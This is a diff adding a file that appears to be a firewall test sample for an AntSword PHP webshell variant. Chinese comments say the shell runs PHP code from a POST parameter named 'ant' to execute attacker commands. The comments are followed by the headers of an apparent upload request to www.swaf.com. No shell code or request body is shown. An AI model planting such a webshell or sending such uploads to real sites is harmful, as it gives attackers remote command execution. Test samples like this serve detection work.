@@ -1,0 +1,15 @@
+# webshell_AntSword_php_createfunction_script_30
+# 这是一个极其简单的蚁剑Webshell变种文件，采用PHP语言编写。当这个PHP文件被访问时，它将接受来自POST请求中名为 ""ant"" 的参数，并将其当作PHP代码执行。
+# 基本信息：
+# - 文件名：php_create_function_script.php
+# - 文件大小：849B
+# 行为描述：
+# - 命令执行：接收并执行攻击者发送的系统命令，例如列出目录内容、修改文件权限等。
+POST /?bid=hd_tag_m8mv242m HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv242m
+RM-PRO-Token: 1959be88081d8000ba0177c5ad0fe06e
+RM-PRO-Time: 1742808359810
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=6985_ixWoLgV0EOoh2vr9sdZUVfBUqdA
+
